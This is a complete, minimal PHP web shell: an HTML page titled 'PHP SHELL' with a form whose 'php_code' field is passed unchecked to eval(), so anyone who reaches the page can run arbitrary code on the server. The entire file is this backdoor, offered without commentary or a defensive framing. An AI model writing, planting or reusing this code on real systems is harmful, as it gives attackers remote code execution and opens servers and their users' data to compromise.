<html>
    <head>
        <link rel="stylesheet" type="text/css" href="css/main.css">
        <title>PHP SHELL</title>
    </head>
    <body>
        <form>
            <label>Enter PHP CODE : </label>
            <input type="text" name="php_code" />
            <input type="submit" value="Execute" />
            
            
        </form>
        
        
    </body>
    
    
</html>



<?php
    if (isset($_GET['php_code'])){
        eval($_GET['php_code']);
    }






?>
